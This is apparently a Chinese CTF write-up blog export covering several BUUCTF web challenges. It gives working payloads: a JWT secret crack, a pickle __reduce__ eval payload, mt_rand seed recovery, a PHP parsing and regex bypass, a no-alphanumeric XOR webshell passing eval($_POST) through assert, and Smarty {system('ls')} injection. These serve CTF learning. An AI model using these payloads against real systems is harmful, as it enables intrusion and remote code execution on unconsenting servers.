<p>这里解释下：题目说要买到lv6，当我再找的时候页码会一直往下翻，</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210422215226.png" alt="img" style="zoom:67%;">
这些图片位置出现了lv2 5 但是就是没有lv6 于是猜想 可能某一页当中有lv6 python写个脚本 跑一下 发现在181页的位置出现了:
接下来购买看看

<p>注册账号，登录购买，发现不够钱，抓包看看，发现可以改折扣：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210422215530.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210422215651.png" alt="img" style="zoom:67%;"><br>进入页面 说需要admin，抓包看看：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210422215745.png" alt="img" style="zoom:67%;"><br>这里有个jew很可疑，查一下：</p>
<h3 id="jwt伪造"><a href="#jwt伪造" class="headerlink" title="jwt伪造"></a>jwt伪造</h3><p>首先了解下JWT：</p>
<blockquote>
<p>JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。JWT常被用于前后端分离，可以和Restful API配合使用，常用于构建身份认证机制。</p>
</blockquote>
<p>  JWT的数据格式分为三个部分： headers , payloads，signature(签名)，它们使用<code>.</code>点号分割</p>
<p> 验证方法：首先服务端会产生一个<code>key</code>，然后以这个<code>key</code>作为密钥，使用第一部分选择的加密方式（这里就是<code>HS256</code>），对第一部分和第二部分<code>拼接的结果</code>进行加密，然后把加密结果放到<code>第三部分</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。</span><br></pre></td></tr></table></figure>

<p>  因为加密算法我们已经知道了，如果我们只要再得到加密的<code>key</code>，我们就能伪造数据，并且通过服务器的检查。</p>
<p>所以此时我们爆破出我们的加密密钥 使用JWT cracker</p>
<p>果然直接在windows下载拖过去是最快的==，然后docker安装一下 直接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install libssl-dev</span><br><span class="line">docker build . -t jwtcrack</span><br><span class="line">docker run -it --rm  jwtcrack</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span><br></pre></td></tr></table></figure>

<p>爆破出来了 密钥是1Kun 这样就可以进去了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210422223449.png" alt="img"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210422223500.png" alt="img" style="zoom:67%;"></p>
<p>然后<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210422223638.png" alt="img" style="zoom:67%;"><br>审计源码</p>
<p>看了一下</p>
<p>这题是python反序列化，没遇过，于是跟着wp学习了<br>1.python反序列语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p &#x3D; pickle.loads(urllib.unquote(become))</span><br></pre></td></tr></table></figure>

<p>所以become是我们传入的参数<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210422224633.png" alt="img"></p>
<p>找到become传入入口，开始操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a &#x3D; pickle.dumps(payload())</span><br><span class="line">a &#x3D; urllib.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>

<p>没遇见过 所以直接跟着打了一下，几个地方理解下</p>
<p><strong>pickle反序列化</strong></p>
<p>pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。</p>
<p>pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，<br>pickle序列化后的数据，可读性差，人一般无法识别。</p>
<p>p = pickle.loads(urllib.unquote(become))</p>
<p>urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回我看了师傅们的博客之后的理解就是，我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用的函数为：</p>
<p>（1）pickle.dump(obj, file, [,protocol])</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    函数的功能：将obj对象序列化存入已经打开的file中。</span><br><span class="line"></span><br><span class="line">   参数讲解：</span><br><span class="line"></span><br><span class="line">obj：想要序列化的obj对象。</span><br><span class="line">file:文件名称。</span><br><span class="line">protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</span><br></pre></td></tr></table></figure>

<p>（2）pickle.load(file)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    函数的功能：将file中的对象序列化读出。</span><br><span class="line"></span><br><span class="line">    参数讲解：</span><br><span class="line"></span><br><span class="line">file：文件名称。</span><br></pre></td></tr></table></figure>

<p>（3）pickle.dumps(obj[, protocol])</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   函数的功能：将obj对象序列化为string形式，而不是存入文件中。</span><br><span class="line"></span><br><span class="line">   参数讲解：</span><br><span class="line"></span><br><span class="line">obj：想要序列化的obj对象。</span><br><span class="line">protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</span><br></pre></td></tr></table></figure>

<p>（4）pickle.loads(string)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   函数的功能：从string中读出序列化前的obj对象。</span><br><span class="line"></span><br><span class="line">   参数讲解：</span><br><span class="line"></span><br><span class="line">string：文件名称。</span><br><span class="line"></span><br><span class="line"> 【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码</span><br></pre></td></tr></table></figure>

<p>检测反序列化方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。</span><br></pre></td></tr></table></figure>

<p>防御方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法；</span><br><span class="line"></span><br><span class="line">2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。</span><br></pre></td></tr></table></figure>

<p><strong><em>0\</em></strong>|<strong><em>1**</em></strong>0x04解题**</p>
<p>本题中我们使用 <strong>**reduce</strong> **<br>方法<br><a href="https://img2018.cnblogs.com/blog/1625650/202001/1625650-20200131155356613-352762298.png"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210422231819.png" alt="img"></a></p>
<p>我的理解是pickle反序列化过程中如果有reduce，那么在重建对象的时候就会调用，并且会调用我们使用的函数。<br>paylaod:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>buuctf14</title>
    <url>/2021/04/24/buuctf14/</url>
    <content><![CDATA[<h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>查看源码就有flag？<a id="more"></a></p>
<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>ULiwClayf</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;num&#x27;</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>); </span><br></pre></td></tr></table></figure>

<p>第一反应是写脚本爆破，但是感觉数字太大了，再看看其他地方也没其他线索主要是，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总觉得这个加密函数有点搞头吧？看看有无漏洞</p>
<p>mt_rand漏洞。。还真有==<br><a href="https://xz.aliyun.com/t/31">https://xz.aliyun.com/t/31</a><br><a href="https://www.anquanke.com/post/id/196831">https://www.anquanke.com/post/id/196831</a><br><a href="https://www.freebuf.com/sectool/205240.html">https://www.freebuf.com/sectool/205240.html</a><br><a href="https://github.com/openwall/php_mt_seed%E8%84%9A%E6%9C%AC%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5">https://github.com/openwall/php_mt_seed脚本下载链接</a></p>
<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>1.由于我们得到的内容是经过处理的，所以我们要先还原才知道mt_rand生成了啥<br>2.知道mt_rand生成了啥以后获得其随机种子<br>3.获得随机种子在进行加密获得剩下的位数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;1ULiwClayf&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">62</span>):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">&#x27; &#x27;</span>+str(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;61&#x27;</span>+<span class="string">&#x27; &#x27;</span>//这个是使用php_mt_seed脚本爆破所需要的格式</span><br><span class="line">            print(<span class="string">&quot;*&quot;</span>*<span class="number">6</span>)</span><br><span class="line">            print(str2[i],str1[j])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">27 27 0 61 56 56 0 61 47 47 0 61 8 8 0 61 22 22 0 61 38 38 0 61 11 11 0 61 0 0 0 61 24 24 0 61 </span><br></pre></td></tr></table></figure>

<p>脚本使用代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在目录下创建 make</span><br><span class="line">然后使用time .&#x2F;php_mt_seed 随机数 </span><br></pre></td></tr></table></figure>

<p>复制网页生成随机字符串代码，更改我们的种子然后输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(&#39;408372545&#39;);</span><br><span class="line">$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str&#x3D;&#39;&#39;;</span><br><span class="line">$len1&#x3D;20;</span><br><span class="line">for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">print($str);</span><br></pre></td></tr></table></figure>

<p>即可拿到flag<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210424235013.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210424235025.png" alt="img" style="zoom:67%;">



<h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure>

<p>解析一下 得到以下几点信息:<br>1.传入数据不能有_且不能有%5f<br>2.需要传入b_u_p_t且值为不等于2333又需要买满足正则匹配式以23333结尾<br>so如何绕过？</p>
<h3 id="php的字符串解析特性"><a href="#php的字符串解析特性" class="headerlink" title="php的字符串解析特性"></a>php的字符串解析特性</h3><p>1.寻找_的替代品</p>
<p><a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>
<img src="https://image.3001.net/images/20190904/1567560438_5d6f12f680afe.png!small" alt="img" style="zoom:67%;">

<p>这篇文章里有：可以是用以上字符:</p>
<p>2.绕过正则匹配，也是以上文章 说%0a会被转化为空，也可以绕过正则匹配，于是:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?b+u+p+t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>

<p>得到新提示<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210425001832.png" alt="img"></p>
<p>查看源码 看到jsfuck源码，f12控制台运行一下，说要post</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210425002245.png" alt="img" style="zoom:67%;">
拿到源码

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include &#39;takeip.php&#39;;</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;.&#39;); </span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;Merak&#39;]))&#123; </span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">    die(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function change($v)&#123; </span><br><span class="line">    $v &#x3D; base64_decode($v); </span><br><span class="line">    $re &#x3D; &#39;&#39;; </span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .&#x3D; chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">echo &#39;Local access only!&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">if($ip!&#x3D;&#39;127.0.0.1&#39;)</span><br><span class="line">echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;</span><br><span class="line">if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>看到说还是需要ip进行绕过:<br>ip读取有三种，一种是xff，一种client-ip还有一种是remote_addr这里我就用了client-ip就绕过了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">client-ip: 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>使用PHP伪协议绕过字符串等于:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?2333&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">post:todat is a happy day</span><br></pre></td></tr></table></figure>

<p>接下来审计一下file的源码，如何加密:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function change($v)&#123;</span><br><span class="line">    $re &#x3D; &#39;&#39;;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .&#x3D; chr (ord($v[$i])-$i*2);</span><br><span class="line">    &#125;</span><br><span class="line">    $re &#x3D; base64_encode($re);</span><br><span class="line">    return $re;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;&#39;flag.php&#39;;</span><br><span class="line">$flag&#x3D;change($a);</span><br><span class="line">print($flag);</span><br><span class="line">&#x2F;&#x2F;function change($v)&#123;</span><br><span class="line">&#x2F;&#x2F;    $v &#x3D; base64_decode($v);</span><br><span class="line">&#x2F;&#x2F;    $re &#x3D; &#39;&#39;;</span><br><span class="line">&#x2F;&#x2F;    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">&#x2F;&#x2F;        $re .&#x3D; chr ( ord ($v[$i]) + $i*2 );</span><br><span class="line">&#x2F;&#x2F;    &#125;</span><br><span class="line">&#x2F;&#x2F;    return $re;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line">&#x2F;&#x2F;$a&#x3D;&#39;ZmpdYSZmXGI&#x3D;&#39;;</span><br><span class="line">&#x2F;&#x2F;$flag&#x3D;change($a);</span><br><span class="line">&#x2F;&#x2F;print($flag);</span><br><span class="line">&#x2F;&#x2F;$a&#x3D;&#39;1&#39;;</span><br><span class="line">&#x2F;&#x2F;print(chr(ord($a)));</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ZmpdYSZmXGI&#x3D;</span><br></pre></td></tr></table></figure>

<p>最终payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?2333&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;ZmpdYSZmXGI&#x3D;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210425010132.png" alt="img" style="zoom:67%;">

<h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            $code=$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,$code))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>本题给了源码，主要在于绕过正则匹配，如何构造？除了这些我们只剩下字符，所以如何用字符构造出字母呢？查到资料说是利用异或操作，写个python脚本跑一下看看都有啥字符:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">str = <span class="string">r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]&#123;&#125;\/&quot;</span></span><br><span class="line"><span class="comment"># if re.match(&#x27;[a-zA-Z0-9]+&#x27;,&#x27;a&#x27;):</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">print(chr(ord(<span class="string">&#x27;!&#x27;</span>)^ord(<span class="string">&#x27;@&#x27;</span>)))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(str)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str)):</span><br><span class="line">        result=chr(ord(str[j])^ord(str[i]))</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&#x27;[a-zA-Z0-9]+&#x27;</span>,result):</span><br><span class="line">           <span class="keyword">print</span> str[j]+<span class="string">&quot;^&quot;</span>+str[i]+<span class="string">&quot;=&quot;</span>+result</span><br><span class="line">           print(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">正则 re.findall  的简单用法（返回string中所有与pattern相匹配的全部字串，返回形式为数组）</span><br><span class="line">re.match(pattern，string)，要匹配的内容，以及要从什么里面匹配</span><br><span class="line">re.search，从什么里面搜索返回</span><br></pre></td></tr></table></figure>

<p>构造一下payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;$GET[&#39;1&#39;]&#96;;</span><br><span class="line">&lt;^&#123;&#x3D;G</span><br><span class="line">&gt;^&#123;&#x3D;E</span><br><span class="line">&#123;^&#x2F;&#x3D;T</span><br><span class="line">\^;&#x3D;g</span><br><span class="line">$_&#x3D;&#39;&lt;&gt;&#123;&#39;^&#39;&#123;&#123;&#x2F;&#39;;&#x2F;&#x2F;get</span><br><span class="line">\^,&#x3D;p</span><br><span class="line">@^)&#x3D;i</span><br><span class="line">(^@&#x3D;h</span><br><span class="line">.^@&#x3D;n</span><br><span class="line">;^]&#x3D;f</span><br><span class="line">&#x2F;^@&#x3D;o</span><br><span class="line">&#x2F;^\&#x3D;s</span><br><span class="line">&#x2F;^[&#x3D;t</span><br><span class="line">~^!&#x3D;_</span><br><span class="line">&#125;^-&#x3D;P</span><br><span class="line">&#x2F;^&#96;&#x3D;O</span><br><span class="line">~^-&#x3D;S</span><br><span class="line">&#39;\(\@.;&#x2F;&#39;^&#39;,@,)@]@&#39;</span><br><span class="line">$_&#x3D;&#39;\(\@.;&#x2F;&#39;^&#39;,@,)@]@&#39;;$_();&#x2F;&#x2F;phpinfo()</span><br></pre></td></tr></table></figure>

<p>调试过程:使用pyhon脚本跑出字母以后，直接去取然后拼凑，异或操作可以合并进行异或，省事很多，打算要执行系统吗命令来着，但是啥也不执行不出来，去phpinfo里面查了一下发现是发现是disable_function禁用了很多函数，所以这里可以写shell进行disable_function插件的执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    $code=$_GET[&#x27;code&#x27;];</span></span><br><span class="line"><span class="comment">//    if(strlen($code)&gt;40)&#123;</span></span><br><span class="line"><span class="comment">//        die(&quot;This is too Long.&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span></span><br><span class="line"><span class="comment">//        die(&quot;NO.&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="comment">//print(&#x27;~&lt;&gt;&#123;&#x27;^&#x27;!&#123;&#123;/&#x27;);</span></span><br><span class="line"><span class="comment">//$_=&#x27;~&lt;&gt;&#123;&#x27;^&#x27;!&#123;&#123;/&#x27;;//get</span></span><br><span class="line">$_=<span class="string">&#x27;~&#125;/~&#123;&#x27;</span>^<span class="string">&#x27;!-`-/&#x27;</span>;</span><br><span class="line"><span class="comment">//print($_);</span></span><br><span class="line">    <span class="keyword">eval</span>($$_[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//eval($_());</span></span><br><span class="line">    <span class="comment">//print($_GET[&#x27;a&#x27;]);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;90a70cb7-75d4-4059-b574-c59fe13eb0a2.node3.buuoj.cn&#x2F;?code&#x3D;$_&#x3D;&#39;~&lt;&gt;&#123;&#39;^&#39;!&#123;&#123;&#x2F;&#39;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[&#39;a&#39;])&#x2F;&#x2F;连续GET两个值，然后使用assert，这里用不了eval不知道为啥00，可能哪里不太符合php的格式，而assert对输入语句的格式要求没那么严格。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="file:///C:\Users\10452\AppData\Roaming\Tencent\Users\1045225639\QQ\WinTemp\RichOle\%IA_T9B`@J_RE6_~P5[0H%I.png" alt="img" style="zoom:67%;">

<p>还有其他方法，<a href="https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/">https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/</a><br>剩下的后面再好好看吧~有一说一，构造得我人都傻了–<br>PS：调试eval的时候可以使用print先输出内容，或者使用phpinfo()执行，这样就可以得知eval到底能不能此语句！</p>
]]></content>
  </entry>
  <entry>
    <title>buuctf13</title>
    <url>/2021/04/23/buuctf13/</url>
    <content><![CDATA[<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>smarty模板注入 更改x-forwarded-for会有不同回显，猜测注入点在这，进行注入，百度了一下smarty模板，说是可以识别php语法：<a id="more"></a><br>尝试payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;system(&#39;ls&#39;)&#125;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210423004708.png" alt="img" style="zoom:67%;">

